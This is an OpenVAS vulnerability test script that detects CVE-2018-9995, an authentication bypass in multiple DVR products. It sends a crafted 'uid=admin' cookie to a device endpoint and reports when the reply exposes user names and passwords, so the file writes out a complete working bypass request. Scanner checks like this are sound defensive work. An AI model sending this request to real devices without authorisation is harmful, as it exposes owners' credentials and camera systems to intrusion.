###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mult_dvr_auth_bypass.nasl 12356 2018-11-15 06:27:24Z ckuersteiner $
#
# Multiple DVR Products Authentication Bypass Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141061");
  script_version("$Revision: 12356 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-15 07:27:24 +0100 (Thu, 15 Nov 2018) $");
  script_tag(name:"creation_date", value:"2018-05-03 13:51:37 +0700 (Thu, 03 May 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2018-9995");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Multiple DVR Products Authentication Bypass Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80, 88, 81, 82, 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Multiple DVR devices allow remote attackers to bypass authentication via a
  crafted cookie header.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution is available as of 15th November, 2018.
Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"http://misteralfa-hack.blogspot.cl/2018/04/tbk-vision-dvr-login-bypass.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default: 80);

banner = get_http_banner(port: port, file: "/login.rsp");
if ("Server: GNU rsp/" >!< banner)
  exit(0);

url = '/device.rsp?opt=user&cmd=list';
cookie = 'uid=admin';

req = http_get_req(port: port, url: url, add_headers: make_array("Cookie", cookie));
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ('{"result":0' >< res && '"uid"' >< res) {
  report = 'It was possible to bypass the authentication and list the available users and their passwords.\n\n' +
           'Result:\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
